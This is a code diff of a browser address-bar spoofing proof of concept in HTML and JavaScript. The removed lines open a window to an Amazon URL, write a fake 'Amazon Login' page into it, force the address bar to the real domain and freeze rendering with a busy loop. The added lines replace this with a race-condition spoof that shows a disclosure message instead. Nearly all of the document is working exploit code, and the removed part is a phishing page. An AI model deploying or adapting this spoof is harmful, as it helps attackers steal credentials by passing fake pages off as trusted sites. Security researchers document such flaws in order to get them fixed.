@@ -1,36 +1,43 @@
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
 <body>
-<a onclick="start()">Spoooooooooooooooof</a>
-
+    <a href="javascript:window.open('https://www.amazon.com:8080/','x');" onclick="startSpoof()">Spoof</a>
+</body>
+    
 <script>
-let w;
+let windowSpoof;
+let raceInterval;
+let forceStopTimeout;
 
-function start() {
-  // 1. Buka about:blank (FULL CONTROL)
-  w = window.open("https://www.amazon.com:8080/", "x");
-
-  // 2. Tulis konten attacker
-  w.document.open();
-  w.document.write(`
-    <h1>Amazon Login</h1>
-    <p>Sign in to continue</p>
-  `);
-  w.document.close();
-
-  // 3. Paksa address bar ke target
-  setTimeout(() => {
-    w.location.replace("https://www.amazon.com:8080/");
-  }, 50);
-
-  // 4. Freeze visual sebelum commit
-  freeze();
+function race() {
+  try {
+    windowSpoof.location.href !== 'about:blank';
+  }
+  catch (e) {
+    windowSpoof.location.href='https://www.google.com/csi';
+  }
 }
 
-function freeze() {
-  try {
-    // Busy loop = block rendering update
-    const t = Date.now();
-    while (Date.now() - t < 3000) {}
-  } catch(e){}
+function stopSpoof() {
+  if (raceInterval) {
+    clearInterval(raceInterval);
+    raceInterval = null;
+  }
+  if (forceStopTimeout) {
+    clearTimeout(forceStopTimeout);
+    forceStopTimeout = null;
+  }
+  console.log('Spoofing stopped');
+}
+
+function startSpoof() {
+  windowSpoof = window.open("https://www.google.com:82","x");
+  windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
+  
+  raceInterval = setInterval(race, 0);
+  
+  // Force stop setelah 3 detik
+  forceStopTimeout = setTimeout(stopSpoof, 3000);
 }
 </script>
-</body>
